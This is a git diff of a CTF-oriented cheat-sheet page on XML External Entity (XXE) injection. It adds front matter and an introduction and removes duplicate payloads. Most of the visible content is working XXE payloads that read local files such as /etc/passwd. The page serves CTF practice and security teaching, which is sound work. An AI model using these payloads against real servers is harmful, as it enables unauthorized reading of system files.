@@ -1,8 +1,24 @@
 ---
-title: XXE
+title: "XML External Entity (XXE)"
+description: "Inject malicious XML entities to read internal files or trigger server requests in XML parsers."
+date: 2025-10-06
+draft: false
+categories: ["Web"]
+tags: ["xxe", "xml", "injection", "local file inclusion", "ctf"]
+authors: ["CTF.Support Team"]
+summary: "Abuse XML parsers that process untrusted input to retrieve files or make out-of-band requests."
+aliases: ["/web/xxe/"]
+slug: "xxe"
+toc: true
 ---
 
-## Detection
+## Introduction
+
+An **XXE (XML External Entity)** vulnerability arises when a server-side XML parser processes external entities.  
+Attackers can read local files or cause SSRF requests from the target server.
+
+## Detection Payload
+
 ``` xml
 <!--?xml version="1.0" ?-->
 <!DOCTYPE replace [<!ENTITY example "Doe"> ]>
@@ -13,11 +29,15 @@ title: XXE
 ```
 
 ## Retreive files
+
 ### Classic XXE
+
 ``` xml
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
 ```
+
 ---
+
 ``` xml
 <?xml version="1.0"?>
 <!DOCTYPE data [
@@ -26,26 +46,14 @@ title: XXE
 ]>
 <data>&file;</data>
 ```
+
 ---
+
 ``` xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
   <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
-```
----
-``` xml
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [  
-  <!ELEMENT foo ANY >
-  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
-```
----
-``` xml
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [  
-  <!ELEMENT foo ANY >
-  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
 ```
 
 ### Classic XXE Base64 encoded
@@ -68,7 +76,9 @@ title: XXE
   </contact>
 </contacts>
 ```
+
 ---
+
 ``` xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
